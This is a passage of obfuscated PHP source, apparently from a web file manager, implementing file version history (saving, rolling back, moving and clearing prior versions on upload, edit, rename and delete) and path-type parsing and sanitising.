$Øà»õ¥[51] . $‘ôôğ„ë[0] . $Øà»õ¥[53]; } } return $£ä‘õ–Ş; } } goto a±òÓ¨¶Ô”; aç­Ï ã¿–: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $œ§äéÒ© =& $_SERVER[Ï×Œõ”û]; $®€ïë£ = $GLOBALS[$œ§äéÒ©[6]][$œ§äéÒ©[92]]; if ($®€ïë£[$œ§äéÒ©[1358]] != 1) { return; } if ($®€ïë£[$œ§äéÒ©[1359]] <= 0) { return; } if (isset($_REQUEST[$œ§äéÒ©[1360]]) && $_REQUEST[$œ§äéÒ©[1360]] == $œ§äéÒ©[91]) { return; } Hook::bind($œ§äéÒ©[1361], $œ§äéÒ©[1362]); Hook::bind($œ§äéÒ©[1363], $œ§äéÒ©[1364]); Hook::bind($œ§äéÒ©[1365], $œ§äéÒ©[1366]); Hook::bind($œ§äéÒ©[1367], $œ§äéÒ©[1368]); Hook::bind($œ§äéÒ©[1369], $œ§äéÒ©[1370]); Hook::bind($œ§äéÒ©[1371], $œ§äéÒ©[1372]); } public static function eventBeforeUpload($¾¼úïÜ„) { if ($¾¼úïÜ„[3] && $¾¼úïÜ„[3] != REPEAT_REPLACE) { return; } $šó¾”Æ = self::parsePath($¾¼úïÜ„[0]); if (!$šó¾”Æ) { return; } self::add($šó¾”Æ); } public static function eventBeforeEdit($ô®¼é) { $…Õ­ãçÌ = self::parsePath($ô®¼é[0]); if (!$…Õ­ãçÌ) { return; } self::add($…Õ­ãçÌ); } public static function eventBeforeCopyFile($İš ÔÇ, $——íÔÒ¤, $Ôº­Â›, $Ã“¼¸£«, $ÙºÀŞÅ», $šº—†€ñ) { $°˜ëÓ¦´ =& $_SERVER[Ï×Œõ”û]; if (isset($Ôº­Â›->_data[$°˜ëÓ¦´[1292]]) && $Ôº­Â›->_data[$°˜ëÓ¦´[1292]]) { return; } $·Ş×ì‡ = $Ôº­Â›->getPathOuter($Ã“¼¸£«); $¿ñ¾ûĞò = self::parsePath($·Ş×ì‡); if (!$¿ñ¾ûĞò) { return; } self::add($¿ñ¾ûĞò); } public static function eventBeforeRename($Ç¬úµÎ›) { $Ú‘ÑïÕÍ =& $_SERVER[Ï×Œõ”û]; $…¡×Úõë = self::parsePath($Ç¬úµÎ›[0]); if (!$…¡×Úõë) { return; } $ŸŞÔ¯âó = self::checkInHistory($…¡×Úõë); if (!$ŸŞÔ¯âó) { return; } if ($ŸŞÔ¯âó[$Ú‘ÑïÕÍ[33]] == $Ú‘ÑïÕÍ[232]) { $¡¤Š æ = self::listData($…¡×Úõë); if ($¡¤Š æ && $¡¤Š æ[$Ú‘ÑïÕÍ[447]]) { self::moveHistory($…¡×Úõë, $Ç¬úµÎ›[1]); } } else { IO::rename($ŸŞÔ¯âó[$Ú‘ÑïÕÍ[87]], $Ç¬úµÎ›[1]); } } public static function eventBeforeMove($İÁ°ìì£) { $‚ÏÙíã§ =& $_SERVER[Ï×Œõ”û]; $Œ€¼òÀ˜ = self::parsePath($İÁ°ìì£[0]); if (!$Œ€¼òÀ˜) { return; } $à¤ï±¹¿ = self::parsePath($İÁ°ìì£[1]); if (!$à¤ï±¹¿) { return; } $ÇËõ¤§Š = $İÁ°ìì£[3]; $”ÖêÂ¢² = self::checkInHistory($Œ€¼òÀ˜); if (!$”ÖêÂ¢²) { return; } $ºÒªÇÉ = self::pathHistory($à¤ï±¹¿); if ($”ÖêÂ¢²[$‚ÏÙíã§[33]] == $‚ÏÙíã§[232]) { $æÀ–‰…• = self::listData($Œ€¼òÀ˜); $±æ©‡ºƒ = rtrim($à¤ï±¹¿, $‚ÏÙíã§[8]) . $‚ÏÙíã§[8] . ($ÇËõ¤§Š ? $ÇËõ¤§Š : get_path_this($Œ€¼òÀ˜)); $ÚÄÍ…ñ = self::listData($±æ©‡ºƒ); if ($æÀ–‰…• && $æÀ–‰…•[$‚ÏÙíã§[447]] && $ÚÄÍ…ñ && $ÚÄÍ…ñ[$‚ÏÙíã§[447]]) { return self::clear($Œ€¼òÀ˜); } if ($æÀ–‰…• && $æÀ–‰…•[$‚ÏÙíã§[447]]) { self::moveHistory($Œ€¼òÀ˜, $ÇËõ¤§Š, $ºÒªÇÉ); } } else { IO::move($”ÖêÂ¢²[$‚ÏÙíã§[87]], $ºÒªÇÉ, !1, $ÇËõ¤§Š); self::clearEmptyFolder(IO::pathFather($”ÖêÂ¢²[$‚ÏÙíã§[87]])); } } public static function eventAfterRemove($ñÙÓ„ı, $©ßš›èò) { $ŒÙ’ÉÇ =& $_SERVER[Ï×Œõ”û]; if (!$©ßš›èò) { return; } $ø‹º˜ş€ = self::parsePath($ñÙÓ„ı[0]); if (!$ø‹º˜ş€) { return; } $Ã»­úÙü = self::checkInHistory($ø‹º˜ş€); if (!$Ã»­úÙü) { return; } if ($Ã»­úÙü[$ŒÙ’ÉÇ[33]] == $ŒÙ’ÉÇ[232]) { $À–¾ÜÓÕ = self::listData($ø‹º˜ş€, !1); if ($À–¾ÜÓÕ && $À–¾ÜÓÕ[$ŒÙ’ÉÇ[447]]) { self::clear($ø‹º˜ş€, !1); } } else { IO::remove($Ã»­úÙü[$ŒÙ’ÉÇ[87]]); self::clearEmptyFolder(IO::pathFather($Ã»­úÙü[$ŒÙ’ÉÇ[87]])); } } private static function checkInHistory($å²œšˆ) { $Ìæƒëà = self::pathHistory($å²œšˆ); if (!IO::exist($Ìæƒëà)) { $Ìæƒëà .= $_SERVER[Ï×Œõ”û][1373]; } return IO::exist($Ìæƒëà) ? IO::info($Ìæƒëà) : !1; } private static function parsePath($ñ›‹¹Ş) { $…ğÆ­° =& $_SERVER[Ï×Œõ”û]; if (!$ñ›‹¹Ş) { return !1; } if (isset($GLOBALS[$…ğÆ­°[1374]]) && $GLOBALS[$…ğÆ­°[1374]]) { return; } $«×ş‰·Ğ = KodIO::parse($ñ›‹¹Ş); $±»Û… = $«×ş‰·Ğ[$…ğÆ­°[33]]; $£°ñûùÉ = !$±»Û… || $±»Û… == KodIO::KOD_IO || $±»Û… == KodIO::KOD_SHARE_ITEM; if (!$£°ñûùÉ || !$«×ş‰·Ğ[$…ğÆ­°[1375]]) { return !1; } if (substr($ñ›‹¹Ş, 0, strlen(DATA_PATH . $…ğÆ­°[1376])) == DATA_PATH . $…ğÆ­°[1376]) { return !1; } if ($±»Û… == KodIO::KOD_SHARE_ITEM) { $ÔÁ¥–ñÈ = IO::init($ñ›‹¹Ş); if ($ÔÁ¥–ñÈ->pathParse[$…ğÆ­°[1288]]) { return self::parsePath($ÔÁ¥–ñÈ->pathParse[$…ğÆ­°[1288]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $åÊ‡ı” = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $…ğÆ­°[1377]); foreach ($åÊ‡ı” as $‰³•‹Ö¥) { if (!$±»Û… && substr($ñ›‹¹Ş, 0, strlen($‰³•‹Ö¥)) == $‰³•‹Ö¥) { return !1; } } self::log($GLOBALS[$…ğÆ­°[1282]] . $…ğÆ­°[1378] . $ñ›‹¹Ş); return $ñ›‹¹Ş; } private static function pathHistory($ã“Á´ÁÈ) { $ù³Æ‰£Ü =& $_SERVER[Ï×Œõ”û]; $Â±†ÔŒè = self::$_historyBase . ltrim(KodIO::clear($ã“Á´ÁÈ), $ù³Æ‰£Ü[8]); $Â±†ÔŒè = str_replace(array($ù³Æ‰£Ü[1379]), array($ù³Æ‰£Ü[1380]), $Â±†ÔŒè); return $Â±†ÔŒè; } public static function log($ëåí¹¶ç) { } public static function historyCount($äƒõÂš) { $…òÚÃ°À =& $_SERVER[Ï×Œõ”û]; $áˆ¢ï¡õ = array(); $¬¡‘À…‡ = array(); foreach ($äƒõÂš as $…’ÃñÉ“) { $ı­² ãè = get_path_father($…’ÃñÉ“); if (!$¬¡‘À…‡[$ı­² ãè]) { $¬¡‘À…‡[$ı­² ãè] = array(); } $¬¡‘À…‡[$ı­² ãè][] = get_path_this($…’ÃñÉ“); } foreach ($¬¡‘À…‡ as $ı­² ãè => $Óµº‡™±) { $ß«Ÿğˆ¯ = self::parsePath($ı­² ãè); if (!$ß«Ÿğˆ¯) { continue; } foreach ($Óµº‡™± as $çÓ¡àÚ¡) { $“Û¯¥¶² = self::listData(rtrim($ß«Ÿğˆ¯, $…òÚÃ°À[8]) . $…òÚÃ°À[8] . $çÓ¡àÚ¡, !1); if ($“Û¯¥¶² && $“Û¯¥¶²[$…òÚÃ°À[447]]) { $áˆ¢ï¡õ[rtrim($ı­² ãè, $…òÚÃ°À[8]) . $…òÚÃ°À[8] . $çÓ¡àÚ¡] = count($“Û¯¥¶²[$…òÚÃ°À[447]]); } } } return $áˆ¢ï¡õ; } public static function add($İŒùé„Å) { $ÔÁâ¢Ñ® =& $_SERVER[Ï×Œõ”û]; $àé„Çª = self::listData($İŒùé„Å); if (!$àé„Çª) { return; } $‡ÚØ”Ô = Model($ÔÁâ¢Ñ®[879])->get($ÔÁâ¢Ñ®[1381]); $ÇğÀ´ø = intval($GLOBALS[$ÔÁâ¢Ñ®[6]][$ÔÁâ¢Ñ®[92]][$ÔÁâ¢Ñ®[1359]]); $–ÓÂ²‚Î = $‡ÚØ”Ô == $ÔÁâ¢Ñ®[1382] ? min(5, $ÇğÀ´ø) : $ÇğÀ´ø; if ($ÇğÀ´ø <= 0) { return; } $Û·§òô = IO::info($İŒùé„Å); $ÁĞÁï€ñ = $àé„Çª[$ÔÁâ¢Ñ®[447]]; if ($Û·§òô[$ÔÁâ¢Ñ®[79]] == 0) { return; } if ($Û·§òô[$ÔÁâ¢Ñ®[79]] >= 1024 * 1024 * 500) { return !1; } $¢°€öíñ = IO::hashSimple($İŒùé„Å); if ($ÁĞÁï€ñ && $ÁĞÁï€ñ[0][$ÔÁâ¢Ñ®[700]] == $¢°€öíñ) { return !0; } if (array_key_exists($ÔÁâ¢Ñ®[235], $Û·§òô) && !$Û·§òô[$ÔÁâ¢Ñ®[235]]) { return !1; } $ËŠ”ÛËó = short_id(time()); $æí™ô¼¡ = array($ÔÁâ¢Ñ®[484] => $ËŠ”ÛËó, $ÔÁâ¢Ñ®[700] => $¢°€öíñ, $ÔÁâ¢Ñ®[32] => $Û·§òô[$ÔÁâ¢Ñ®[32]] . $ÔÁâ¢Ñ®[10] . date($ÔÁâ¢Ñ®[1383]) . rand_string(1), $ÔÁâ¢Ñ®[79] => $Û·§òô[$ÔÁâ¢Ñ®[79]], $ÔÁâ¢Ñ®[546] => USER_ID, $ÔÁâ¢Ñ®[233] => time(), $ÔÁâ¢Ñ®[1384] => $ÔÁâ¢Ñ®[12]); IO::mkdir($àé„Çª[$ÔÁâ¢Ñ®[1385]]); $ù¼«Ú¢Ø = IO::copy($İŒùé„Å, $àé„Çª[$ÔÁâ¢Ñ®[1385]], !1, $æí™ô¼¡[$ÔÁâ¢Ñ®[32]]); if (!$ù¼«Ú¢Ø) { self::clearEmptyFolder($àé„Çª[$ÔÁâ¢Ñ®[1385]]); return !1; } array_unshift($ÁĞÁï€ñ, $æí™ô¼¡); if (count($ÁĞÁï€ñ) > $–ÓÂ²‚Î) { $œÃÄÓ„› = array_slice($ÁĞÁï€ñ, $–ÓÂ²‚Î); foreach ($œÃÄÓ„› as $ĞœÜèÛà) { IO::remove($àé„Çª[$ÔÁâ¢Ñ®[1385]] . $ĞœÜèÛà[$ÔÁâ¢Ñ®[32]]); } $ÁĞÁï€ñ = array_slice($ÁĞÁï€ñ, 0, $–ÓÂ²‚Î); } return self::saveData($àé„Çª[$ÔÁâ¢Ñ®[1386]], $ÁĞÁï€ñ); } public static function remove($Âø…¨ëŠ, $²»ÑÈëï) { $¬å„Œ­Š =& $_SERVER[Ï×Œõ”û]; $ÔÂ¬µ·Á = self::listData($Âø…¨ëŠ); $ï…ÏŞ–Î = array(); if (!$ÔÂ¬µ·Á) { return !1; } foreach ($ÔÂ¬µ·Á[$¬å„Œ­Š[447]] as $¿’úÙÔŒ) { if ($¿’úÙÔŒ[$¬å„Œ­Š[484]] == $²»ÑÈëï) { IO::remove($ÔÂ¬µ·Á[$¬å„Œ­Š[1385]] . $¿’úÙÔŒ[$¬å„Œ­Š[32]]); continue; } $ï…ÏŞ–Î[] = $¿’úÙÔŒ; } return self::saveData($ÔÂ¬µ·Á[$¬å„Œ­Š[1386]], $ï…ÏŞ–Î); } public static function clear($£€áĞİ, $£ß¿÷è = true) { $§Ï¿Ä‚ =& $_SERVER[Ï×Œõ”û]; $×Ó‚ÇÎ€ = self::listData($£€áĞİ, $£ß¿÷è); if (!$×Ó‚ÇÎ€) { return !1; } foreach ($×Ó‚ÇÎ€[$§Ï¿Ä‚[447]] as $Ï÷Á—¬) { IO::remove($×Ó‚ÇÎ€[$§Ï¿Ä‚[1385]] . $Ï÷Á—¬[$§Ï¿Ä‚[32]]); } return self::saveData($×Ó‚ÇÎ€[$§Ï¿Ä‚[1386]], array()); } public static function moveHistory($éŸ»áË, $áİİŞº = '', $ô«„»Â = '') { $ÄËÓ·Á¸ =& $_SERVER[Ï×Œõ”û]; $ø“˜Û•ê = self::listData($éŸ»áË, !1); if (!$ø“˜Û•ê || !$ø“˜Û•ê[$ÄËÓ·Á¸[447]]) { return !1; } $Ô§„µÓ¤ = $ÄËÓ·Á¸[1373]; $áİİŞº = $áİİŞº ? $áİİŞº : get_path_this($éŸ»áË); $ô«„»Â = $ô«„»Â ? $ô«„»Â : $ø“˜Û•ê[$ÄËÓ·Á¸[1385]]; $¤Ì›ƒÃ— = substr(get_path_this($ø“˜Û•ê[$ÄËÓ·Á¸[1386]]), 0, -strlen($Ô§„µÓ¤)); foreach ($ø“˜Û•ê[$ÄËÓ·Á¸[447]] as $ëú‰’í => $ŸÔäá) { $³à®œï = $áİİŞº . substr($ŸÔäá[$ÄËÓ·Á¸[32]], strlen($¤Ì›ƒÃ—)); $ß§ÉÅÚ– = IO::move($ø“˜Û•ê[$ÄËÓ·Á¸[1385]] . $ŸÔäá[$ÄËÓ·Á¸[32]], $ô«„»Â, !1, $³à®œï); if ($ß§ÉÅÚ–) { $ø“˜Û•ê[$ÄËÓ·Á¸[447]][$ëú‰’í][$ÄËÓ·Á¸[32]] = $³à®œï; } } $ø“˜Û•ê[$ÄËÓ·Á¸[1386]] = IO::move($ø“˜Û•ê[$ÄËÓ·Á¸[1386]], $ô«„»Â, !1, $áİİŞº . $Ô§„µÓ¤); self::saveData($ø“˜Û•ê[$ÄËÓ·Á¸[1386]], $ø“˜Û•ê[$ÄËÓ·Á¸[447]]); self::clearEmptyFolder($ø“˜Û•ê[$ÄËÓ·Á¸[1385]]); } public static function rollback($Ù•ÙÅ‰µ, $É½ÀÜÃ¯) { $Œ‚¢ÚÄõ =& $_SERVER[Ï×Œõ”û]; $¢‹õ„ìÒ = self::listData($Ù•ÙÅ‰µ); if (!$¢‹õ„ìÒ) { return; } $¶‘Ä‡â± = IO::info($Ù•ÙÅ‰µ); foreach ($¢‹õ„ìÒ[$Œ‚¢ÚÄõ[447]] as $ÜäÀíúô => $öë­şü) { if ($öë­şü[$Œ‚¢ÚÄõ[484]] == $É½ÀÜÃ¯) { self::add($Ù•ÙÅ‰µ); $ÇÔ©£Ş” = $¢‹õ„ìÒ[$Œ‚¢ÚÄõ[1385]] . $öë­şü[$Œ‚¢ÚÄõ[32]]; $Ï‹¤Æ» = IO::copy($ÇÔ©£Ş”, IO::pathFather($Ù•ÙÅ‰µ), REPEAT_REPLACE, $¶‘Ä‡â±[$Œ‚¢ÚÄõ[32]]); if ($Ï‹¤Æ») { self::remove($Ù•ÙÅ‰µ, $É½ÀÜÃ¯); } return $Ï‹¤Æ»; } } return !1; } public static function setDetail($ñâÒİü, $ø³è´, $Ÿ’İŠ²) { $²ØÆŠÂÛ =& $_SERVER[Ï×Œõ”û]; $­–¢ıîª = self::listData($ñâÒİü); if (!$­–¢ıîª) { return; } foreach ($­–¢ıîª[$²ØÆŠÂÛ[447]] as $’°©áéÉ => $Üê§‚½ƒ) { if ($Üê§‚½ƒ[$²ØÆŠÂÛ[484]] == $ø³è´) { $­–¢ıîª[$²ØÆŠÂÛ[447]][$’°©áéÉ][$²ØÆŠÂÛ[1384]] = $Ÿ’İŠ²; self::saveData($­–¢ıîª[$²ØÆŠÂÛ[1386]], $­–¢ıîª[$²ØÆŠÂÛ[447]]); return !0; } } return !1; } public static function fileInfo($¶ó¡÷‰, $şİõ…«) { $óÊš º =& $_SERVER[Ï×Œõ”û]; $›ªüî­ì = self::listData($¶ó¡÷‰); if (!$›ªüî­ì) { show_json(LNG($óÊš º[106]), !1); } $’Ã…´• = $óÊš º[12]; foreach ($›ªüî­ì[$óÊš º[447]] as $º«™ßÖü => $†ÃÛƒµÅ) { if ($†ÃÛƒµÅ[$óÊš º[484]] != $şİõ…«) { continue; } $’Ã…´• = $›ªüî­ì[$óÊš º[1385]] . $†ÃÛƒµÅ[$óÊš º[32]]; break; } if (!$’Ã…´•) { show_json(LNG($óÊš º[106]), !1); } return IO::info($’Ã…´•); } public static function fileOut($†¿ä°Õï, $‡„ú…, $Ú™úå½Ê = false) { $›¹ù ÏÏ =& $_SERVER[Ï×Œõ”û]; $·Ó±¿…— = self::fileInfo($†¿ä°Õï, $‡„ú…); $º“ÒÈ‡Õ =& $GLOBALS[$›¹ù ÏÏ[7]]; $Ú™úå½Ê = isset($º“ÒÈ‡Õ[$›¹ù ÏÏ[1336]]) && $º“ÒÈ‡Õ[$›¹ù ÏÏ[1336]] == 1; if (isset($º“ÒÈ‡Õ[$›¹ù ÏÏ[33]]) && $º“ÒÈ‡Õ[$›¹ù ÏÏ[33]] == $›¹ù ÏÏ[1387]) { return IO::fileOutImage($·Ó±¿…—[$›¹ù ÏÏ[87]], $º“ÒÈ‡Õ[$›¹ù ÏÏ[1388]]); } IO::fileOut($·Ó±¿…—[$›¹ù ÏÏ[87]], $Ú™úå½Ê, get_path_this($†¿ä°Õï)); } public static function listData($êÏ´ûçş, $Û¤ıò¤º = true) { $¬ôãš´â =& $_SERVER[Ï×Œõ”û]; if ($Û¤ıò¤º && !IO::exist($êÏ´ûçş)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($êÏ´ûçş, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $š·Íëé‹ = self::pathHistory($êÏ´ûçş); $¨ŠŸªŠ = array($¬ôãš´â[1386] => $š·Íëé‹ . $¬ôãš´â[1373], $¬ôãš´â[1385] => rtrim(get_path_father($š·Íëé‹), $¬ôãš´â[8]) . $¬ôãš´â[8], $¬ôãš´â[447] => array()); $âÜ°²¬ğ = IO::getContent($¨ŠŸªŠ[$¬ôãš´â[1386]]); if ($âÜ°²¬ğ) { $¢ç “³µ = json_decode($âÜ°²¬ğ, !0); if (is_array($¢ç “³µ)) { $¨ŠŸªŠ[$¬ôãš´â[447]] = $¢ç “³µ; } } return $¨ŠŸªŠ; } private static function saveData($ƒÉ®£ ¦, $ø–ää§Ü) { $£Ü¨øÆª =& $_SERVER[Ï×Œõ”û]; self::log($£Ü¨øÆª[1389] . $ƒÉ®£ ¦ . $£Ü¨øÆª[74] . count($ø–ää§Ü), $£Ü¨øÆª[858]); if ($ø–ää§Ü) { return IO::setContent($ƒÉ®£ ¦, json_encode($ø–ää§Ü)); } $Ó˜™Ò× = IO::pathFather($ƒÉ®£ ¦); IO::remove($ƒÉ®£ ¦); self::clearEmptyFolder($Ó˜™Ò×); return !0; } public static function clearEmptyFolder($§¡şÉÜ) { $ÄŠ£Øº— =& $_SERVER[Ï×Œõ”û]; if (trim($§¡şÉÜ, $ÄŠ£Øº—[8]) == trim(self::$_historyBase, $ÄŠ£Øº—[8])) { return; } $©ŸääÇÄ = IO::pathFather($§¡şÉÜ); $­äĞ¼±ğ = IO::has($§¡şÉÜ, !0); if ($­äĞ¼±ğ[$ÄŠ£Øº—[241]] > 0 || $­äĞ¼±ğ[$ÄŠ£Øº—[242]] > 0) { return; } IO::remove($§¡şÉÜ); self::clearEmptyFolder($©ŸääÇÄ); } private static function getBasePath() { $®åâ×”Ç =& $_SERVER[Ï×Œõ”û]; $°¨±ı³É = Model($®åâ×”Ç[1390])->get($®åâ×”Ç[1391]); if ($°¨±ı³É) { if (!IO::exist($°¨±ı³É)) { IO::mkdir($°¨±ı³É); } if (get_path_this($°¨±ı³É) == $®åâ×”Ç[1376]) { $’–ú­¬ = $®åâ×”Ç[1392] . rand_string(8); @rename($°¨±ı³É, get_path_father($°¨±ı³É) . $®åâ×”Ç[8] . $’–ú­¬); $°¨±ı³É = DATA_PATH . $’–ú­¬ . $®åâ×”Ç[8]; file_put_contents(DATA_PATH . $®åâ×”Ç[1324], $®åâ×”Ç[12]); Model($®åâ×”Ç[1390])->set($®åâ×”Ç[1391], $°¨±ı³É); } return $°¨±ı³É; } $°¨±ı³É = DATA_PATH . $®åâ×”Ç[1392] . rand_string(8) . $®åâ×”Ç[8]; $°¨±ı³É = IO::mkdir($°¨±ı³É); $°¨±ı³É = rtrim($°¨±ı³É, $®åâ×”Ç[8]) . $®åâ×”Ç[8]; file_put_contents($°¨±ı³É . $®åâ×”Ç[1324], $®åâ×”Ç[12]); file_put_contents(DATA_PATH . $®åâ×”Ç[1324], $®åâ×”Ç[12]); Model($®åâ×”Ç[1390])->set($®åâ×”Ç[1391], $°¨±ı³É); return $°¨±ı³É; } } class KodIO { const KOD_SOURCE = "\x7b\163\x6f\165\x72\143\x65\x7d"; const KOD_USER_RECYCLE = "\x7b\x75\x73\x65\x72\x52\145\x63\x79\x63\x6c\x65\x7d"; const KOD_USER_FAV = "\x7b\165\163\145\162\x46\141\166\175"; const KOD_USER_FILE_TAG = "\x7b\x75\x73\145\x72\x46\151\x6c\145\124\141\147\x7d"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\x65\x72\x46\151\x6c\x65\x54\171\160\145\x7d"; const KOD_GROUP_ROOT_SELF = "\173\147\162\157\165\160\x52\x6f\x6f\164\123\x65\x6c\x66\x7d"; const KOD_USER_SHARE = "\x7b\165\x73\x65\162\x53\150\x61\x72\x65\x7d"; const KOD_USER_SHARE_LINK = "\x7b\x75\x73\145\x72\x53\150\x61\162\145\x4c\151\x6e\153\x7d"; const KOD_USER_SHARE_TO_ME = "\173\x73\x68\141\x72\x65\124\157\x4d\x65\175"; const KOD_SHARE_ITEM = "\173\163\x68\x61\162\145\x49\x74\145\x6d\x7d"; const KOD_SHARE_LINK = "\x7b\163\150\141\162\145\x49\x74\145\155\114\151\x6e\x6b\x7d"; const KOD_SHARE_OUTER = "\x7b\x73\x68\141\162\x65\111\164\x65\155\117\x75\164\x7d"; const KOD_SEARCH = "\173\163\x65\x61\x72\143\x68\x7d"; const KOD_BLOCK = "\173\142\154\x6f\x63\153\175"; const KOD_IO = "\173\x69\157\x7d"; const KOD_USER_RECENT = "\x7b\165\x73\x65\x72\122\x65\x6e\x63\x65\156\164\175"; const KOD_USER_DRIVER = "\x7b\144\x72\151\x76\145\x72\x7d"; public static function typeList() { $›áÕï˜ =& $_SERVER[Ï×Œõ”û]; return array($›áÕï˜[1393] => self::KOD_SOURCE, $›áÕï˜[1394] => self::KOD_USER_RECYCLE, $›áÕï˜[1395] => self::KOD_USER_FAV, $›áÕï˜[1396] => self::KOD_USER_FILE_TAG, $›áÕï˜[1397] => self::KOD_USER_FILE_TYPE, $›áÕï˜[1398] => self::KOD_GROUP_ROOT_SELF, $›áÕï˜[1399] => self::KOD_USER_SHARE, $›áÕï˜[1400] => self::KOD_USER_SHARE_LINK, $›áÕï˜[1401] => self::KOD_USER_SHARE_TO_ME, $›áÕï˜[1402] => self::KOD_SHARE_ITEM, $›áÕï˜[1403] => self::KOD_SHARE_LINK, $›áÕï˜[1404] => self::KOD_SHARE_OUTER, $›áÕï˜[1405] => self::KOD_SEARCH, $›áÕï˜[1406] => self::KOD_BLOCK, $›áÕï˜[1407] => self::KOD_IO, $›áÕï˜[1408] => self::KOD_USER_RECENT, $›áÕï˜[1409] => self::KOD_USER_DRIVER); } public static function parse($ÄÇŠèÁù) { $Áú½Õ¿ =& $_SERVER[Ï×Œõ”û]; $ÄÇŠèÁù = self::clear($ÄÇŠèÁù); $Õ†Ùåàè = array_values(self::typeList()); preg_match($Áú½Õ¿[1410], $ÄÇŠèÁù, $ÍëôÜ•Ò); $Šı£»©ô = array($Áú½Õ¿[516] => !1, $Áú½Õ¿[1411] => !1, $Áú½Õ¿[513] => !1, $Áú½Õ¿[87] => $ÄÇŠèÁù, $Áú½Õ¿[1308] => !1, $Áú½Õ¿[1307] => $Áú½Õ¿[12]); if (is_array($ÍëôÜ•Ò) && count($ÍëôÜ•Ò) == 5) { $¹¶êè = $Áú½Õ¿[1412] . $ÍëôÜ•Ò[2] . $Áú½Õ¿[404]; if (in_array($¹¶êè, $Õ†Ùåàè)) { $Šı£»©ô[$Áú½Õ¿[1308]] = $ÍëôÜ•Ò[1]; $Šı£»©ô[$Áú½Õ¿[33]] = $¹¶êè; $Šı£»©ô[$Áú½Õ¿[1413]] = substr($¹¶êè, 1, -1); $Šı£»©ô[$Áú½Õ¿[484]] = $ÍëôÜ•Ò[3]; } $Šı£»©ô[$Áú½Õ¿[1307]] = $ÍëôÜ•Ò[4]; } if ($Šı£»©ô[$Áú½Õ¿[516]] == self::KOD_SOURCE) { $Šı£»©ô[$Áú½Õ¿[484]] = intval($Šı£»©ô[$Áú½Õ¿[484]]); $Šı£»©ô[$Áú½Õ¿[1311]] = $Šı£»©ô[$Áú½Õ¿[484]]; } $èàòÉÃï = array($Áú½Õ¿[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_SHARE_OUTER, self::KOD_USER_DRIVER); $Šı£»©ô[$Áú½Õ¿[1375]] = in_array($Šı£»©ô[$Áú½Õ¿[33]], $èàòÉÃï); return $Šı£»©ô; } public static function isTruePath($íÖ½¾œ·) { $ù¥¯íç =& $_SERVER[Ï×Œõ”û]; if (substr($íÖ½¾œ·, 0, 1) != $ù¥¯íç[1412]) { return !0; } if (strpos($íÖ½¾œ·, $ù¥¯íç[503]) === 0) { return !0; } if (strpos($íÖ½¾œ·, $ù¥¯íç[1379]) === 0) { return !0; } if (strpos($íÖ½¾œ·, $ù¥¯íç[1414]) === 0) { return !0; } if (strpos($íÖ½¾œ·, $ù¥¯íç[1415]) === 0) { return !0; } if (strpos($íÖ½¾œ·, $ù¥¯íç[1416]) === 0) { return !0; } if (strpos($íÖ½¾œ·, $ù¥¯íç[1417]) === 0) { return !0; } return !1; } public static function clear($ÇÀÚ»­Œ) { $ˆ¢şè‡Û =& $_SERVER[Ï×Œõ”û]; $ÇÀÚ»­Œ = str_replace(array($ˆ¢şè‡Û[1201], $ˆ¢şè‡Û[287]), $ˆ¢şè‡Û[53], $ÇÀÚ»­Œ); $ÇÀÚ»­Œ = str_replace($ˆ¢şè‡Û[98], $ˆ¢şè‡Û[8], $ÇÀÚ»­Œ); $ªó€ÊçÁ = $ˆ¢şè‡Û[1418]; if (substr($ÇÀÚ»­Œ, 0, 3) == $ˆ¢şè‡Û[1419]) { $ÇÀÚ»­Œ = substr($ÇÀÚ»­Œ, 3); } while (strstr($ÇÀÚ»­Œ, $ªó€ÊçÁ)) { $ÇÀÚ»­Œ = str_replace($ªó€ÊçÁ, $ˆ¢şè‡Û[8], $ÇÀÚ»­Œ); } $ÇÀÚ»­Œ = preg_replace($ˆ¢şè‡Û[1420], $ˆ¢şè‡Û[8], $ÇÀÚ»­Œ); if ($ÇÀÚ»­Œ == $ˆ¢şè‡Û[8]) { return $ˆ¢şè‡Û[8]; } $ÇÀÚ»­Œ = rtrim($ÇÀÚ»­Œ, $ˆ¢şè‡Û[8]); return $ÇÀÚ»­Œ; } public static function pathTrue($â¼šñ¤ï) { $®Ì°¨ì =& $_SERVER[Ï×Œõ”û]; if (!$â¼šñ¤ï) { return $®Ì°¨ì[12]; } $â¼šñ¤ï = str_replace($®Ì°¨ì[256], $®Ì°¨ì[8], str_replace($®Ì°¨ì[1421], $®Ì°¨ì[8], $â¼šñ¤ï)); $â¼šñ¤ï = str_replace($®Ì°¨ì[256], $®Ì°¨ì[8], str_replace($®Ì°¨ì[1421], $®Ì°¨ì[8], $â¼šñ¤ï)); if (!strstr($â¼šñ¤ï, $®Ì°¨ì[1419])) { return $â¼šñ¤ï; } $¸Ó‚îŸ¹ = explode($®Ì°¨ì[8], $â¼šñ¤ï); foreach ($¸Ó‚îŸ¹ as $ÓïÇ˜¼è => $½ãÁ¦Ë) { if ($½ãÁ¦Ë !== $®Ì°¨ì[1422]) { continue; } for ($¼ªøìáı = $ÓïÇ˜¼è; $¼ªøìáı >= 0; $¼ªøìáı--) { if ($¸Ó‚îŸ¹[$¼ªøìáı] === $®Ì°¨ì[10] || $¸Ó‚îŸ¹[$¼ªøìáı] === $®Ì°¨ì[1422] || $¸Ó‚îŸ¹[$¼ªøìáı] === -1) { continue; } if ($¸Ó‚îŸ¹[$¼ªøìáı] === $®Ì°¨ì[12]) { $¸Ó‚îŸ¹[$ÓïÇ˜¼è] = -1; break; } $¸Ó‚îŸ¹[$ÓïÇ˜¼è] = -1; $¸Ó‚îŸ¹[$¼ªøìáı] = -1; break; } } $äÒ½ŞÁÉ = array(); foreach ($¸Ó‚îŸ¹ as $½ãÁ¦Ë) { if ($½ãÁ¦Ë !== -1) { $äÒ½ŞÁÉ[] = $½ãÁ¦Ë; } } $Í½Şçˆ½ = implode($®Ì°¨ì[8], $äÒ½ŞÁÉ); if (strpos($Í½Şçˆ½, $®Ì°¨ì[1423]) === 0) { $Í½Şçˆ½ = $®Ì°¨ì[1419] . substr($Í½Şçˆ½, strlen($®Ì°¨ì[1423])); } 